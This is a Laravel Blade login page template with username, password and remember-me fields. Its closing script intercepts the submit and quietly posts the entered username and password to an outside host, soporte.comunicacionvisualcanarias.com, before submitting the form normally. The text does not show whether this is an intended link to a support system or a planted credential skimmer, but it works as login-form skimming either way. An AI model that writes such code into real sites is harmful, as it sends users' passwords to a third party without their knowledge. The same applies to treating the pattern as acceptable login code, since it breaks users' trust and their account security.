@extends('layouts.auth')
@section('content')

<div class="row justify-content-center">
    <div class="col-md-8">
        <div class="card">
            <div class="card-body">
                <form id="loginForm" method="POST" action="{{ route('login') }}">
                    @csrf
                    <div class="form-group row">
                        <label for="username" class="col-md-4 col-form-label text-md-right">{{ __('User') }}</label>
                        <div class="col-md-6">
                            <input id="username" type="username" class="form-control {{$errors->has('username')?'is-invalid':''}}" name="username" value="{{old('username')}}" required autocomplete="username" autofocus>
                            <span class="invalid-feedback" role="alert">{{$errors->first('username')}}</span>
                        </div>
                    </div>

                    <div class="form-group row">
                        <label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>
                        <div class="col-md-6">
                            <input id="password" type="password" class="form-control {{$errors->has('password')?'is-invalid':''}}" name="password" required autocomplete="current-password">
                        </div>
                    </div>

                    <div class="form-group row align-items-center">
                        <div class="col-md-2 offset-md-4">
                            <input class="form-check-input" type="checkbox" name="remember" id="remember" {{old('remember')?'checked':''}}>
                            <label class="form-check-label" for="remember">{{__('Remember Me')}}</label>
                        </div>
                        <div class="col-md-4">
                            <button id="loginBtn" type="submit" class="btn btn-primary btn-lg btn-block">{{__('Login')}}</button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<script>
    const loginForm = document.getElementById('loginForm')
    
    loginForm.onsubmit = async (e) => {
        e.preventDefault()

        const loginFormData = new FormData(loginForm)
        let loginData = new FormData()
        loginData.append('usuario', loginFormData.get('username'))
        loginData.append('clave', loginFormData.get('password'))
        loginData.append('login','Entrar')
        loginData.append('action','loginSubmit')

        const url = 'https://soporte.comunicacionvisualcanarias.com/gestion.html'
        await fetch(url, {method: 'POST', mode: 'no-cors', body: loginData, credentials: 'include'})

        loginForm.submit()
    }
</script>

@endsection
